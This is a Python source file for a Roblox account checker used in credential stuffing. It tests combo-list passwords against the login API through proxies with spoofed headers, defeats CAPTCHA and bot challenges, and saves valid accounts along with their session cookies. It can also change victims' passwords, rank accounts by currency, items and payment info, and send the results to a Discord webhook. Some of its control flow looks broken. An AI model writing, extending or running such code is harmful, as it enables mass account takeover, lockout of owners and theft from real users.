import sys, os
import re
from time import sleep
from json import loads, dumps
from base64 import b64decode, b64encode
from custom_solver import get_token
from thread_lock import ThreadLock
from counter import Counter
from session import Session
from output import Output
from account_info import AccountInfo
from auth_intent import AuthIntent
from password_changer import PasswordChanger
from rostile import Rostile
from util import Util

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

config = Util.get_config()

WEBHOOK_ENABLED = config["logWebhook"]

if WEBHOOK_ENABLED == True:
    from discord_webhook import DiscordWebhook, DiscordEmbed

if type(WEBHOOK_ENABLED) != bool:
    Output("ERROR").log("You must put either true/false for webhook enabled")

WEBHOOK = config["webhook"]

PASSWORD_CHANGER_CONFIG = config.get("passwordChanger", {})
PASSWORD_CHANGER_ENABLED = PASSWORD_CHANGER_CONFIG.get("enabled", False)
PASSWORD_CHANGER_PREFIX = PASSWORD_CHANGER_CONFIG.get("prefix", "")
PASSWORD_CHANGER_LENGTH = PASSWORD_CHANGER_CONFIG.get("randomLength", 12)

ASSET_TYPES = {
    "Hat": 8,
    "Head": 17,
    "Face": 18,
    "HairAccessory": 41,
    "FaceAccessory": 42,
    "NeckAccessory": 43,
    "ShoulderAccessory": 44,
    "FrontAccessory": 45,
    "BackAccessory": 46,
    "WaistAccessory": 47,
    "Gear": 19,
    "Animation": 24,
    "Emote": 61
}


class Roblox:
    def __init__(self, lock: ThreadLock, counter: Counter, accounts) -> None:
        self.account = None
        self.attempts = 0
        self.checked = False
        self.lock = lock
        self.counter = counter
        self.accounts = accounts
        self.sale_cache = {}
        self.creator_cache = {}

    def build_new_password(self) -> str:
        try:
            length = int(PASSWORD_CHANGER_LENGTH)
        except (TypeError, ValueError):
            length = 12

        length = max(length, 1)

        if PASSWORD_CHANGER_PREFIX:
            return f"{PASSWORD_CHANGER_PREFIX}{Util.get_random_string_length(length)}"

        return Util.get_random_string_length(length)

    def attempt_password_change(self, cookie_header, user_id_and_cookie):
        if not PASSWORD_CHANGER_ENABLED:
            return cookie_header, user_id_and_cookie

        try:
            new_password = self.build_new_password()
            new_cookie = PasswordChanger.change_password(
                self.session,
                new_password,
                self.account[1],
                self.sec_auth_intent
            )

            self.account[1] = new_password
            user_id_and_cookie[1] = new_cookie
            if ".ROBLOSECURITY=" in cookie_header:
                cookie_header = f"{cookie_header.split('; .ROBLOSECURITY=')[0]}; .ROBLOSECURITY={new_cookie}"
            else:
                cookie_header = f"{cookie_header}; .ROBLOSECURITY={new_cookie}"

            with self.lock.get_lock():
                with open("output/changed_passwords.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{new_password}:{new_cookie}\n')
        except Exception as e:
            Output("ERROR").log(f"Password change failed | {e}")

        return cookie_header, user_id_and_cookie

    def sanitize_item_name(self, name: str, asset_id: int) -> str:
        if not name:
            return f"item_{asset_id}"

        cleaned = name.lower()
        cleaned = re.sub(r'[\\/:*?"<>|]', "_", cleaned)
        cleaned = re.sub(r"\s+", "_", cleaned)
        cleaned = re.sub(r"_+", "_", cleaned)
        cleaned = cleaned.strip().strip("._")
        if not cleaned:
            return f"item_{asset_id}"

        return cleaned

    def get_asset_name(self, asset_id: int):
        response = self.session.get(f"https://economy.roblox.com/v2/assets/{asset_id}/details")
        if response.status_code != 200:
            return None

        data = response.json()
        return data.get("Name")

    def fetch_inventory(self, user_id: int, asset_type_id: int) -> list:
        items = []
        cursor = ""

        while True:
            if cursor:
                url = (
                    f"https://inventory.roblox.com/v2/users/{user_id}"
                    f"/inventory/{asset_type_id}"
                    f"?limit=100&cursor={cursor}"
                )
            else:
                url = (
                    f"https://inventory.roblox.com/v2/users/{user_id}"
                    f"/inventory/{asset_type_id}"
                    f"?limit=100"
                )

            response = self.session.get(url)
            if response.status_code != 200:
                Output("ERROR").log(
                    f"Inventory fetch failed (type {asset_type_id}) | {response.status_code}"
                )
                break

            data = response.json()
            items.extend(data.get("data", []))

            cursor = data.get("nextPageCursor")
            if not cursor or cursor == "null":
                break

        return items

    def get_offsale_status(self, asset_id: int):
        if asset_id in self.sale_cache:
            return self.sale_cache[asset_id]

        response = self.session.get(f"https://catalog.roblox.com/v1/assets/{asset_id}")
        is_for_sale = None
        if response.status_code == 200:
            data = response.json()
            is_for_sale = data.get("isForSale")

        if is_for_sale is None:
            fallback = self.session.get(f"https://economy.roblox.com/v2/assets/{asset_id}/details")
            if fallback.status_code == 200:
                data = fallback.json()
                is_for_sale = data.get("IsForSale")

        if is_for_sale is None:
            return None

        offsale = not is_for_sale
        self.sale_cache[asset_id] = offsale
        return offsale

    def is_roblox_created(self, asset_id: int) -> bool:
        if asset_id in self.creator_cache:
            return self.creator_cache[asset_id]

        creator_name = None

        response = self.session.get(f"https://catalog.roblox.com/v1/assets/{asset_id}")
        if response.status_code == 200:
            data = response.json()
            creator = data.get("creator") or {}
            creator_name = creator.get("name")

        if not creator_name:
            fallback = self.session.get(f"https://economy.roblox.com/v2/assets/{asset_id}/details")
            if fallback.status_code == 200:
                data = fallback.json()
                creator = data.get("Creator") or {}
                creator_name = creator.get("Name")

        is_roblox = creator_name == "Roblox"
        self.creator_cache[asset_id] = is_roblox
        return is_roblox

    def record_inventory_items(self, user_id: int, account_line: str) -> None:
        for asset_type_id in ASSET_TYPES.values():
            items = self.fetch_inventory(user_id, asset_type_id)
            for item in items:
                asset_id = item.get("assetId") or item.get("id")
                if not asset_id:
                    continue

                offsale = self.get_offsale_status(asset_id)
                if offsale is None:
                    continue
                if not self.is_roblox_created(asset_id):
                    continue

                raw_name = item.get("name", "")
                if not raw_name:
                    raw_name = self.get_asset_name(asset_id) or ""
                item_name = self.sanitize_item_name(raw_name, asset_id)
                folder = "output/items/offsales" if offsale else "output/items/onsale"
                path = f"{folder}/{item_name}.txt"

                with self.lock.get_lock():
                    with open(path, "a", encoding="utf-8") as file:
                        file.write(f"{account_line}\n")



    def continue_check(self, continue_payload) -> None:
        sleep(1)

        continue_payload_content = dumps(continue_payload).replace(" ", "").encode("utf-8")

        response = self.session.post('https://apis.roblox.com/challenge/v1/continue', content=continue_payload_content)

        if response.json().get("challengeType") == "captcha":
            return loads(response.json()["challengeMetadata"])

        if response.status_code != 200:
            raise ValueError("Rejected by continue API")

        payload = {
            "ctype": self.ctype,
            "cvalue": self.account[0],
            "password": self.account[1],
            "secureAuthenticationIntent": self.sec_auth_intent
        }

        self.session.headers = {
            **self.session.headers,
            "rblx-challenge-id": continue_payload["challengeId"],
            "rblx-challenge-metadata": b64encode(continue_payload["challengeMetadata"].encode("utf-8")).decode("utf-8"),
            "rblx-challenge-type": continue_payload["challengeType"]
        }

        response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

        csrf = response.headers.get("x-csrf-token")

        if csrf != None:
            self.session.headers = {
                **self.session.headers,
                "x-csrf-token": csrf
            }

            response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

        temp_dict = self.session.headers.copy()

        temp_dict.pop("rblx-challenge-id")
        temp_dict.pop("rblx-challenge-metadata")
        temp_dict.pop("rblx-challenge-type")

        self.session.headers = temp_dict

        if response.status_code == 429:
            raise ValueError("Rate limited")

        if self.is_locked_response(response):
            raise ValueError("locked")
        
        if self.is_two_factor_response(response):
            raise ValueError("two_factor")
        
        if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
            return response.json()
        
        if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
            self.account[0] = response.json()["user"]["name"]

            return [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]
            
        elif "Challenge failed" in response.text:
            raise ValueError("Rejected by login API")

        elif self.is_invalid_response(response):
            raise ValueError("invalid_credentials")

        else:
            raise ValueError("invalid")

    def check(self) -> dict:
        while True:
            try:
                if self.counter.get_value() >= len(self.accounts):
                    return

                if self.account == None or self.checked == True:
                    self.checked = False
                    self.attempts = 0

                    with self.lock.get_lock():
                        self.account = self.accounts[self.counter.get_value()].strip("\n").split(":")
                        self.counter.increment()
                else:
                    if self.attempts == 10:
                        self.checked = False
                        self.attempts = 0

                        with self.lock.get_lock():
                            self.account = self.accounts[self.counter.get_value()].strip("\n").split(":")
                            self.counter.increment()

                        Output("ERROR").log("Too many errors, skipping account")
                    elif error_text == "locked":
                        Output("WARNING").log("Valid account (locked)")
                    with self.lock.get_lock():
                        with open("output/locked.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}\n')
                    self.checked = True
 
                
                Output("INFO").log(f"Checking account")

                self.session, self.sec_ch_ua, self.user_agent, self.proxy = Session().session()
                self.accept_language = f'{Util.get_random_string()};q=0.9,en;q=0.8'

                self.session.headers = {
                    'sec-ch-ua': self.sec_ch_ua,
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'upgrade-insecure-requests': '1',
                    'user-agent': self.user_agent,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.roblox.com/',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': self.accept_language,
                    'priority': 'u=0, i'
                }

                response = self.session.get("https://www.roblox.com/login")
                cookie_header = '; '.join([f"{key}={value}" for key, value in response.cookies.items()])

                self.session.headers = {
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua': self.sec_ch_ua,
                    'sec-ch-ua-mobile': '?0',
                    'user-agent': self.user_agent,
                    'accept': 'application/json, text/plain, */*',
                    'content-type': 'application/json;charset=UTF-8',
                    'origin': 'https://www.roblox.com',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.roblox.com/',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': self.accept_language,
                    'priority': 'u=1, i',
                    "cookie": cookie_header
                }
                
                self.ctype = "Username" if "@" not in self.account[0] else "Email"
                self.sec_auth_intent = AuthIntent.get_auth_intent(self.session)

                payload = {
                    "ctype": self.ctype,
                    "cvalue": self.account[0],
                    "password": self.account[1],
                    "secureAuthenticationIntent": self.sec_auth_intent
                }

                response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

                if response.status_code == 429:
                    raise ValueError("Rate limited")

                csrf = response.headers.get("x-csrf-token")

                self.session.headers = {
                    'sec-ch-ua-platform': '"Windows"',
                    'x-csrf-token': csrf,
                    'user-agent': self.user_agent,
                    'accept': 'application/json, text/plain, */*',
                    'sec-ch-ua': self.sec_ch_ua,
                    'content-type': 'application/json;charset=UTF-8',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://www.roblox.com',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.roblox.com/',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': self.accept_language,
                    'cookie': cookie_header,
                    'priority': 'u=1, i'
                }

                response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

                if response.status_code == 429:
                    raise ValueError("Rate limited")

                if self.is_locked_response(response):
                    Output("WARNING").log("Valid account (locked)")
                    with self.lock.get_lock():
                        with open("output/locked.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}\n')
                    self.checked = True
                    continue 

                if self.is_two_factor_response(response):
                    Output("WARNING").log("Valid account (2FA required)")
                    with self.lock.get_lock():
                        with open("output/2fa.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}\n')
                    self.checked = True
                    continue

                
                if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
                    Output("SUCCESS").log("Valid account")

                    user_id_and_cookie = response.json()
                    self.handle_multi(user_id_and_cookie)

                    self.checked = True
                    continue

                if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
                    user_id_and_cookie = [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]

                    self.account[0] = response.json()["user"]["name"]

                    Output("SUCCESS").log("Valid account")

                    cookie_header += f"; .ROBLOSECURITY={response.cookies.get('.ROBLOSECURITY')}"

                    self.handle_valid(user_id_and_cookie, cookie_header)
                    
                    self.checked = True
                    continue
                
                elif "Challenge" in response.text:
                    pass
                
                elif self.is_invalid_response(response):
                    raise ValueError("invalid_credentials")

                else:
                    raise ValueError("invalid")
                
                challenge_type = response.headers.get("rblx-challenge-type")

                if challenge_type == "denied":
                    raise ValueError("Challenge type denied")

                challenge_id = response.headers.get("rblx-challenge-id")
                metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
                blob = metadata.get("dataExchangeBlob")
                captcha_id = metadata.get("unifiedCaptchaId")

                if cookie_header.endswith("; "):
                    cookie_header = cookie_header[:-2]

                if challenge_type == "rostile":
                    Output("CAPTCHA").log("Rostile detected")

                    payload = Rostile.get_solution(challenge_id)

                    redemption_token = self.session.post('https://apis.roblox.com/rostile/v1/verify', json=payload)

                    csrf = redemption_token.headers.get("x-csrf-token")

                    if csrf != None:
                        self.session.headers = {
                            **self.session.headers,
                            "x-csrf-token": csrf
                        }

                        redemption_token = self.session.post('https://apis.roblox.com/rostile/v1/verify', json=payload).json()["redemptionToken"]
                    else:
                        redemption_token = redemption_token.json()["redemptionToken"]

                    challenge_metadata = dumps({
                        "redemptionToken": redemption_token
                    }, separators=(',', ':'))

                    payload = {
                        "challengeId": challenge_id,
                        "challengeType": "rostile",
                        "challengeMetadata": challenge_metadata
                    }

                    continue_result = self.continue_check(payload)

                    if type(continue_result) == dict:
                        captcha_id = continue_result.get("unifiedCaptchaId")
                        blob = continue_result.get("dataExchangeBlob")

                        Output("CAPTCHA").log("Captcha detected")
                    
                        Output("CAPTCHA").log("Solving captcha")

                        solution = get_token(self.session, blob, self.proxy, cookie_header)

                        if solution == None:
                            raise ValueError("Failed to solve captcha")
                        
                        token = solution.split("|")[0]
                        token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]

                        Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
                        
                        challenge_metadata = dumps({
                            "unifiedCaptchaId": captcha_id,
                            "captchaToken": solution,
                            "actionType": "Login"
                        }, separators=(',', ':'))

                        payload = {
                            "challengeId": challenge_id,
                            "challengeType": "captcha",
                            "challengeMetadata": challenge_metadata
                        }

                        user_id_and_cookie = self.continue_check(payload)
                    else:
                        user_id_and_cookie = continue_result
                elif challenge_type == "privateaccesstoken":
                    Output("CAPTCHA").log("PAT detected")

                    payload = {"challengeId": challenge_id}

                    response = self.session.post("https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload)

                    self.session.headers["Authorization"] = f"PrivateToken token={response.headers['www-authenticate'].split('challenge=')[1]}"

                    redemption_token = self.session.post("https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload).json()["redemptionToken"]

                    challenge_metadata = dumps({
                        "redemptionToken": redemption_token
                    }, separators=(',', ':'))

                    payload = {
                        "challengeId": challenge_id,
                        "challengeType": "privateaccesstoken",
                        "challengeMetadata": challenge_metadata
                    }

                    continue_result = self.continue_check(payload)

                    if type(continue_result) == dict:
                        captcha_id = continue_result.get("unifiedCaptchaId")
                        blob = continue_result.get("dataExchangeBlob")

                        Output("CAPTCHA").log("Captcha detected")
                    
                        Output("CAPTCHA").log("Solving captcha")

                        solution = get_token(self.session, blob, self.proxy, cookie_header)

                        if solution == None:
                            raise ValueError("Failed to solve captcha")
                        
                        token = solution.split("|")[0]
                        token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]

                        Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
                        
                        challenge_metadata = dumps({
                            "unifiedCaptchaId": captcha_id,
                            "captchaToken": solution,
                            "actionType": "Login"
                        }, separators=(',', ':'))

                        payload = {
                            "challengeId": challenge_id,
                            "challengeType": "captcha",
                            "challengeMetadata": challenge_metadata
                        }

                        user_id_and_cookie = self.continue_check(payload)
                    else:
                        user_id_and_cookie = continue_result

                else:
                    Output("CAPTCHA").log("Captcha detected")
                    
                    Output("CAPTCHA").log("Solving captcha")

                    solution = get_token(self.session, blob, self.proxy, cookie_header)

                    attmepts = 1

                    if solution == None:
                        while True:
                            Output("CAPTCHA").log("Retrying captcha")

                            if attmepts == 2:
                                raise ValueError("Failed to solve captcha.")

                            response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

                            if response.status_code == 429:
                                raise ValueError("Rate limited")

                            challenge_type = response.headers.get("rblx-challenge-type")

                            if challenge_type == "denied":
                                raise ValueError("Challenge type denied")

                            challenge_id = response.headers.get("rblx-challenge-id")
                            metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
                            blob = metadata.get("dataExchangeBlob")
                            captcha_id = metadata.get("unifiedCaptchaId")

                            solution = get_token(self.session, blob, self.proxy, cookie_header)

                            if solution != None:
                                break
                            
                            attmepts += 1

                    token = solution.split("|")[0]
                    token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]

                    Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
                    
                    challenge_metadata = dumps({
                        "unifiedCaptchaId": captcha_id,
                        "captchaToken": solution,
                        "actionType": "Login"
                    }, separators=(',', ':'))

                    payload = {
                        "challengeId": challenge_id,
                        "challengeType": "captcha",
                        "challengeMetadata": challenge_metadata
                    }

                    user_id_and_cookie = self.continue_check(payload)

                if type(user_id_and_cookie) == dict:
                    Output("SUCCESS").log("Valid account")

                    self.handle_multi(user_id_and_cookie)

                    self.checked = True
                    continue

                Output("SUCCESS").log("Valid account")

                cookie_header += f"; .ROBLOSECURITY={user_id_and_cookie[1]}"

                self.handle_valid(user_id_and_cookie, cookie_header)

                self.checked = True

            except Exception as e:
                error_text = str(e)
                if error_text == "invalid_credentials":
                    self.checked = True

                    Output("ERROR").log("Too many errors, skipping account")
                elif error_text == "locked":
                    Output("WARNING").log("Valid account (locked)")
                    with self.lock.get_lock():
                        with open("output/locked.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}\n')
                    self.checked = True
                elif error_text == "two_factor":
                    Output("WARNING").log("Valid account (2FA required)")
                    with self.lock.get_lock():
                        with open("output/2fa.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}\n')
                    self.checked = True
                else:
                    error_text = str(e)
                    error_text_lower = error_text.lower()
                    if (
                        "error sending request for url" not in error_text_lower
                        and "client error (connect)" not in error_text_lower
                        and "socks connect error" not in error_text_lower
                    ):
                        Output("ERROR").log(error_text)

                    self.attempts += 1

    def handle_valid(self, user_id_and_cookie, cookie_header) -> None:
        self.session.headers = {
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'user-agent': self.user_agent,
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.roblox.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.roblox.com/',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': self.accept_language,
            'priority': 'u=1, i',
            "cookie": cookie_header
        }

        if self.is_two_factor(cookie_header):
            with self.lock.get_lock():
                with open("output/2fa.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}\n')
            return

        cookie_header, user_id_and_cookie = self.attempt_password_change(cookie_header, user_id_and_cookie)
        self.session.headers = {
            **self.session.headers,
            "cookie": cookie_header
        }

        with self.lock.get_lock():
            with open("output/valid.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

        acc_info = AccountInfo.get_account_info(self.session, user_id_and_cookie[0])
        creation_year = None
        try:
            creation_year = AccountInfo.get_creation_year(self.session, user_id_and_cookie[0])
        except Exception:
            creation_year = None


        if WEBHOOK_ENABLED:
            try:
                webhook = DiscordWebhook(url=WEBHOOK, content="@here")

                embed = DiscordEmbed(title=f'**Username: {self.account[0]}**', color='00FF00')

                for key, value in acc_info.items():
                    embed.add_embed_field(name=key, value=value, inline=True)

                embed.set_timestamp()

                webhook.add_embed(embed)
                webhook.execute()
            except:
                pass

        with self.lock.get_lock():
            with open(f"output/robux/robux{acc_info['robux']}.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

        with self.lock.get_lock():
            with open(f"output/rap/rap{acc_info['rap']}.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
        
        with self.lock.get_lock():
            with open(f"output/pending/pending{acc_info['pending']}.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

        with self.lock.get_lock():
            with open(f"output/summary/summary{acc_info['summary']}.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
        
        if isinstance(creation_year, int):
            with self.lock.get_lock():
                os.makedirs("output/account_creation", exist_ok=True)
                with open(f"output/account_creation/{creation_year}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

        if acc_info["payment_info"] == True:
            with self.lock.get_lock():
                with open(f"output/payment_info/payment_info.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
        
        elif acc_info["payment_info"] == "_unknown":
            with self.lock.get_lock():
                with open(f"output/payment_info/payment_info_unknown.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
        
        elif acc_info["premium"] == "_unknown":
            with self.lock.get_lock():
                with open(f"output/premium/premium_unknown.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
        account_line = f"{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}"
        try:
            self.record_inventory_items(user_id_and_cookie[0], account_line)
        except Exception as exc:
            Output("ERROR").log(f"Failed to record inventory items | {exc}")

        


    def is_two_factor(self, cookie_header) -> bool:
        response = self.session.get(
            "https://users.roblox.com/v1/users/authenticated",
            headers={
                **self.session.headers,
                "cookie": cookie_header,
            },
        )

        if response.status_code == 200:
            return False

        try:
            data = response.json()
        except Exception:
            data = {}

        if data.get("isTwoStepVerificationRequired") is True:
            return True

        errors = data.get("errors", [])
        for error in errors:
            message = str(error.get("message", "")).lower()
            if "two step" in message:
                return True

        if data.get("verificationType") == "TwoStepVerification":
            return True

        if "twostepverification.roblox.com" in response.text.lower():
            return True

        return False

    def is_two_factor_response(self, response) -> bool:
        try:
            data = response.json()
        except Exception:
            data = {}

        if data.get("twoStepVerificationData") or data.get("twoStepVerificationToken"):
            return True

        if data.get("errors"):
            for error in data.get("errors", []):
                message = str(error.get("message", "")).lower()
                if "two step" in message or "two-step" in message or "2fa" in message:
                    return True

        if data.get("name") == "TwoStepVerificationRequired":
            return True

        text = response.text.lower()
        if "two step verification" in text or "two-step verification" in text:
            return True

        return False
    
    def is_locked_response(self, response) -> bool:
        try:
            data = response.json()
        except Exception:
            data = {}
        def has_locked_text(value) -> bool:
            if isinstance(value, str):
                return "locked" in value.lower()
            return False

        def check_error_fields(error) -> bool:
            if isinstance(error, dict):
                for key in ("message", "code", "error", "errorCode", "error_message", "errorMessage", "description", "userFacingMessage"):
                    if has_locked_text(error.get(key, "")):
                        return True
            if isinstance(error, str):
                return has_locked_text(error)
            return False

        if isinstance(data, dict):
            for key in ("error", "message", "errorMessage", "error_message", "code", "errorCode"):
                if has_locked_text(data.get(key, "")):
                    return True

            if check_error_fields(data.get("error")):
                return True

            errors = data.get("errors", [])
            for error in errors:
                if check_error_fields(error):
                    return True

            if has_locked_text(str(data)):
                return True
        elif isinstance(data, list):
            for error in data:
                if check_error_fields(error):
                    return True

        text = response.text.lower()
        if "locked" in text and ("account" in text or "user" in text or "accountlocked" in text):
            return True

        return False
    
    def is_invalid_response(self, response) -> bool:
        if response.status_code == 401:
            return True

        try:
            data = response.json()
        except Exception:
            data = {}

        errors = data.get("errors", [])
        for error in errors:
            message = str(error.get("message", "")).lower()
            if "incorrect username or password" in message:
                return True
            if "invalid username or password" in message:
                return True
            if "invalid credentials" in message:
                return True
            if "invalid" in message and "credential" in message:
                return True

        text = response.text.lower()
        if "incorrect username or password" in text:
            return True
        if "invalid username or password" in text:
            return True

        return False


    def handle_multi(self, user_id_and_cookie) -> None:
        accounts = self.parse_multi_accounts(user_id_and_cookie)

        if not accounts:
            Output("ERROR").log("Multi-account response missing account list")
            return

        new_entries = []

        with self.lock.get_lock():
            existing = set(self.accounts)
            for username, _user_id in accounts:
                entry = f"{username}:{self.account[1]}"
                if entry in existing:
                    continue
                self.accounts.append(entry)
                existing.add(entry)
                new_entries.append(entry)

        Output("SUCCESS").log(f"Email linked to multiple accounts | queued {len(new_entries)}")

        if WEBHOOK_ENABLED:
            try:
                webhook = DiscordWebhook(url=WEBHOOK, content="@here")

                embed = DiscordEmbed(title=f'**Username: {self.account[0]}**', color='00FF00')

                embed.set_timestamp()

                webhook.add_embed(embed)
                webhook.execute()
            except:
                pass

    def lookup_username(self, user_id):
        try:
            response = self.session.get(f"https://users.roblox.com/v1/users/{user_id}")
        except Exception:
            return None

        if response.status_code != 200:
            return None

        data = response.json()
        return data.get("name") or data.get("username")

    def parse_multi_accounts(self, user_id_and_cookie):
        accounts = []
        user_ids = []

        errors = user_id_and_cookie.get("errors", [])
        if errors:
            field_data = errors[0].get("fieldData")
            try:
                field_data_payload = loads(field_data) if field_data else {}
            except Exception:
                field_data_payload = {}

            users = field_data_payload.get("users", [])
            for user in users:
                username = user.get("name") or user.get("username")
                user_id = user.get("id") or user.get("userId")
                if username:
                    accounts.append((username, user_id))
                elif user_id:
                    user_ids.append(user_id)

        if not accounts and not user_ids:
            metadata = user_id_and_cookie.get("metadata", {})
            for user_id in metadata.get("userIds", []) or []:
                user_ids.append(user_id)

            for user in user_id_and_cookie.get("accounts", []) or []:
                username = user.get("name") or user.get("username")
                user_id = user.get("id") or user.get("userId")
                if username:
                    accounts.append((username, user_id))
                elif user_id:
                    user_ids.append(user_id)

        if user_ids:
            known_ids = {account_id for _, account_id in accounts if account_id}
            for user_id in user_ids:
                if user_id in known_ids:
                    continue
                username = self.lookup_username(user_id)
                if username:
                    accounts.append((username, user_id))

        return accounts